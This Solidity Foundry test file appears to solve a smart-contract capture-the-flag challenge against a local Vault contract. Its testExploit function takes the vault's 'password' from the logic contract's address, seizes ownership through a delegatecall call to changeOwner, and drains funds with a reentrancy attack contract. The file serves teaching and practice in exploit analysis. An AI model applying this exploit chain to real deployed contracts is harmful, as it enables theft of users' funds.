// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Vault.sol";
import {ReentrancyAttack} from "../src/attack.sol";




contract VaultExploiter is Test {
    Vault public vault;
    VaultLogic public logic;
    ReentrancyAttack public attack;

    address owner = address (1);
    address player = address (2);

    function setUp() public {
        vm.deal(owner, 1 ether);

        vm.startPrank(owner);
        logic = new VaultLogic(bytes32("0x1234"));
        vault = new Vault(address(logic));
        attack = new ReentrancyAttack(address(vault));

        vault.deposite{value: 0.1 ether}();
        vm.stopPrank();

    }

    function testExploit() public {
        vm.deal(player, 1 ether);
        vm.startPrank(player);
        // add your hacker code.

        

        bytes32 psw = bytes32(uint256(uint160(address(logic))));
        address(vault).call(abi.encodeWithSignature("changeOwner(bytes32,address)", psw, address(player)));
        vault.openWithdraw();
        address(attack).call{value : 0.01 ether}(abi.encodeWithSignature("receiveETH()"));
        attack.deposit();
        attack.withdraw();

        require(vault.isSolve(), "solved");
        vm.stopPrank();
    }

 
}
